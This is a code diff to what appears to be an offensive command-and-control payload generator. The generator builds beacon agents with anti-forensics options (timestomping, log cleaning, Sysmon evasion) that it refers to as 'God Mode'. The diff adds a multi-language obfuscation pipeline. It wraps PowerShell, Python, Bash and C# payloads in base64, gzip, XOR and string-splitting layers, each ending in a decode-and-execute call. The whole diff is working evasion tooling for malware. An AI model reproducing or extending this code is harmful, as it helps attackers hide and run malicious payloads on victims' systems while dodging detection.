@@ -17,7 +17,20 @@ class PayloadGenerator:
         self.c2_url = c2_url
     
     def generate(self, payload_type: str, options: Dict[str, Any] = None) -> str:
-        """Generate payload based on type"""
+        """
+        Generate payload based on type with automatic obfuscation pipeline
+        
+        Args:
+            payload_type: 'python', 'powershell', 'bash', etc.
+            options: Dictionary with:
+                - god_mode: {enabled, timestomp, clean_logs, sysmon_evade}
+                - obfuscation_level: 'none', 'basic', 'advanced'
+                - obfuscation_method: specific method (overrides level)
+                - sleep, jitter, etc.
+        
+        Returns:
+            Obfuscated payload (if obfuscation enabled)
+        """
         options = options or {}
         
         generators = {
@@ -30,7 +43,21 @@ class PayloadGenerator:
         }
         
         generator = generators.get(payload_type, self._gen_python)
-        return generator(options)
+        payload = generator(options)
+        
+        # AUTO OBFUSCATION PIPELINE
+        obfuscation_level = options.get('obfuscation_level', 'none')
+        obfuscation_method = options.get('obfuscation_method')
+        
+        if obfuscation_level != 'none' or obfuscation_method:
+            payload = PayloadObfuscationPipeline.obfuscate(
+                payload,
+                language=payload_type.lower(),
+                obfuscation_level=obfuscation_level,
+                method=obfuscation_method
+            )
+        
+        return payload
     
     def _gen_python(self, options: Dict[str, Any]) -> str:
         """Generate full Python beacon agent with God Mode Anti-Forensics"""
@@ -1144,3 +1171,199 @@ class PowerShellEncoder:
         # Join and minimize whitespace
         minified = ' '.join(line.strip() for line in lines if line.strip())
         return minified
+
+
+# ============================================================================
+# MASTER OBFUSCATION PIPELINE - Multi-Language, Multi-Method
+# ============================================================================
+
+class PayloadObfuscationPipeline:
+    """
+    Universal payload obfuscation pipeline for all payload types
+    Handles: PowerShell, Python, Bash, C#, VBScript, JavaScript, etc.
+    Methods: String splitting, XOR, ROT13, base64 layering, etc.
+    """
+    
+    # Obfuscation methods registry
+    OBFUSCATION_METHODS = {
+        'none': 'Direct output (no obfuscation)',
+        'base64': 'Simple Base64 encoding',
+        'base64_utf16': 'UTF-16LE Base64 (PowerShell -Enc)',
+        'xor': 'XOR cipher (1-255)',
+        'rot13': 'ROT13 + Base64 combo',
+        'double_base64': 'Double Base64 encoding',
+        'string_splitting': 'Split into chunks (3-4 parts)',
+        'gzip_base64': 'GZIP compress + Base64',
+        'random_vars': 'Rename variables randomly',
+        'mixed': 'Combine XOR + Base64 + splitting',
+    }
+    
+    @staticmethod
+    def obfuscate(
+        payload: str,
+        language: str = 'powershell',
+        obfuscation_level: str = 'basic',
+        method: str = None
+    ) -> str:
+        """
+        Apply obfuscation to payload based on language and level
+        
+        Args:
+            payload: Raw payload code
+            language: 'powershell', 'python', 'bash', 'csharp', 'vbscript', etc.
+            obfuscation_level: 'none', 'basic', 'advanced'
+            method: Specific obfuscation method (overrides level)
+        
+        Returns:
+            Obfuscated payload
+        """
+        if obfuscation_level == 'none' or method == 'none':
+            return payload
+        
+        # Route to language-specific obfuscator
+        if language.lower() in ['powershell', 'ps', 'pwsh']:
+            return PayloadObfuscationPipeline._obfuscate_powershell(
+                payload, obfuscation_level, method
+            )
+        elif language.lower() in ['python', 'py']:
+            return PayloadObfuscationPipeline._obfuscate_python(
+                payload, obfuscation_level, method
+            )
+        elif language.lower() in ['bash', 'sh']:
+            return PayloadObfuscationPipeline._obfuscate_bash(
+                payload, obfuscation_level, method
+            )
+        elif language.lower() in ['csharp', 'cs', 'c#']:
+            return PayloadObfuscationPipeline._obfuscate_csharp(
+                payload, obfuscation_level, method
+            )
+        else:
+            # Generic obfuscation
+            return PayloadObfuscationPipeline._obfuscate_generic(
+                payload, obfuscation_level, method
+            )
+    
+    @staticmethod
+    def _obfuscate_powershell(payload: str, level: str, method: str = None) -> str:
+        """PowerShell-specific obfuscation"""
+        if method == 'base64_utf16' or level in ['basic', 'advanced']:
+            return PowerShellEncoder.generate_oneliner(payload, level)
+        elif method == 'xor':
+            return PayloadObfuscationPipeline._xor_obfuscate_ps(payload)
+        elif method == 'string_splitting':
+            return PowerShellEncoder._basic_obfuscate(payload)
+        elif method == 'mixed':
+            return PowerShellEncoder._advanced_obfuscate(payload)
+        else:
+            return payload
+    
+    @staticmethod
+    def _obfuscate_python(payload: str, level: str, method: str = None) -> str:
+        """Python-specific obfuscation"""
+        import zlib
+        
+        if method == 'gzip_base64':
+            compressed = zlib.compress(payload.encode())
+            b64 = base64.b64encode(compressed).decode()
+            return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{b64}')))"
+        elif method == 'base64':
+            b64 = base64.b64encode(payload.encode()).decode()
+            return f"exec(__import__('base64').b64decode('{b64}'))"
+        elif method == 'string_splitting':
+            return PayloadObfuscationPipeline._split_python_string(payload)
+        elif level in ['basic', 'advanced']:
+            # Default Python: GZIP + Base64
+            return PayloadObfuscationPipeline._obfuscate_python(payload, 'none', 'gzip_base64')
+        else:
+            return payload
+    
+    @staticmethod
+    def _obfuscate_bash(payload: str, level: str, method: str = None) -> str:
+        """Bash-specific obfuscation"""
+        if method == 'base64':
+            b64 = base64.b64encode(payload.encode()).decode()
+            return f"echo {b64}|base64 -d|bash"
+        elif method == 'hex':
+            hex_payload = payload.encode().hex()
+            return f"echo -n {hex_payload}|xxd -r -p|bash"
+        elif method == 'string_splitting':
+            return PayloadObfuscationPipeline._split_bash_string(payload)
+        elif level in ['basic', 'advanced']:
+            return PayloadObfuscationPipeline._obfuscate_bash(payload, 'none', 'base64')
+        else:
+            return payload
+    
+    @staticmethod
+    def _obfuscate_csharp(payload: str, level: str, method: str = None) -> str:
+        """C#-specific obfuscation"""
+        if method == 'base64':
+            b64 = base64.b64encode(payload.encode()).decode()
+            return f'''string payload = @"{b64}";
+byte[] data = Convert.FromBase64String(payload);
+string decoded = Encoding.UTF8.GetString(data);
+Assembly.Load(decoded);'''
+        elif level in ['basic', 'advanced']:
+            return PayloadObfuscationPipeline._obfuscate_csharp(payload, 'none', 'base64')
+        else:
+            return payload
+    
+    @staticmethod
+    def _obfuscate_generic(payload: str, level: str, method: str = None) -> str:
+        """Generic obfuscation for unknown languages"""
+        if method == 'base64':
+            b64 = base64.b64encode(payload.encode()).decode()
+            return b64
+        elif level in ['basic', 'advanced']:
+            return PayloadObfuscationPipeline._obfuscate_generic(payload, 'none', 'base64')
+        else:
+            return payload
+    
+    @staticmethod
+    def _xor_obfuscate_ps(payload: str) -> str:
+        """XOR obfuscation for PowerShell"""
+        xor_key = random.randint(1, 255)
+        xor_bytes = bytearray([ord(c) ^ xor_key for c in payload])
+        xor_b64 = base64.b64encode(xor_bytes).decode()
+        
+        return f"""$xorKey={xor_key};$xorB64='{xor_b64}';$xorBytes=[Convert]::FromBase64String($xorB64);$decoded='';$xorBytes|%{{$decoded+=[char]($_-bxor $xorKey)}};iex $decoded"""
+    
+    @staticmethod
+    def _split_python_string(payload: str, chunks: int = 3) -> str:
+        """Split Python code into chunks"""
+        chunk_size = len(payload) // chunks
+        parts = [
+            payload[i*chunk_size:(i+1)*chunk_size]
+            for i in range(chunks-1)
+        ]
+        parts.append(payload[(chunks-1)*chunk_size:])
+        
+        code = "code = "
+        for i, part in enumerate(parts):
+            escaped = part.replace('"', '\\"').replace('\n', '\\n')
+            if i == 0:
+                code += f'"{escaped}" \\\n'
+            elif i == len(parts) - 1:
+                code += f'    + "{escaped}"\n'
+            else:
+                code += f'    + "{escaped}" \\\n'
+        code += "exec(code)"
+        
+        return code
+    
+    @staticmethod
+    def _split_bash_string(payload: str, chunks: int = 3) -> str:
+        """Split Bash code into chunks"""
+        chunk_size = len(payload) // chunks
+        parts = [
+            payload[i*chunk_size:(i+1)*chunk_size]
+            for i in range(chunks-1)
+        ]
+        parts.append(payload[(chunks-1)*chunk_size:])
+        
+        bash_code = "bash -c '"
+        for part in parts:
+            escaped = part.replace("'", "'\\''")
+            bash_code += escaped
+        bash_code += "'"
+        
+        return bash_code
